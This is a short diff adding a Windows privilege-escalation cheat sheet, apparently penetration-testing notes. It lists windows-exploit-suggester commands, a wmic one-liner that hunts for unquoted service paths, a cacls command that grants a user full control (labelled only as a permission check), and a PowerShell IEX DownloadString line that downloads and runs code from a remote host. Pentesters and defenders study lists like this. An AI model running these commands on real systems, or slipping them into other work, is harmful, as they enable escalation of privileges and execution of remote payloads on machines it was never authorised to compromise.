@@ -1,0 +1,10 @@
+
+windows-exploit-suggester.py --update
+windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt 
+windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --ostext 'windows server 2008 r2' 
+
+# unquoted service paths
+wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
+cacls <file.txt> /t /e /p UserName:F   # check permissions 
+powershell IEX (New-Object Net.WebClient).DownloadString('http://somesite.com')
+
